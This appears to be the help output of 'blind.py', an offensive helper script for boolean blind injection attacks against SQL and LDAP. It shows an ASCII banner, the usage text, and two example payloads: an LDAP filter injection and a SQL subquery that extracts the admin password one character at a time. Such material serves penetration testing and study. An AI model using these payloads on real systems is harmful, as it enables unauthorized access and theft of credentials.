```bash
$ python3 blind.py -h

    , __  _                   
   /|/  \| | o             |  
    | __/| |     _  _    __|  
    |   \|/  |  / |/ |  /  |  
    |(__/|__/|_/  |  |_/\_/|_/*

    Stupid helper for boolean blind injections. @Iceish                         
    
usage: blind.py [-h] [-d] {inject,fuzz} payload

Help to exploit blind injections (SQL, LDAP and more).

positional arguments:
  {inject,fuzz}  Action method to inject
  payload        Payload to inject in the request

options:
  -h, --help     show this help message and exit
  -d, --debug    Enable debug mode

examples:
    python blind.py inject "admin)(&)"
    python blind.py fuzz "AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='{FUZZ}"
```
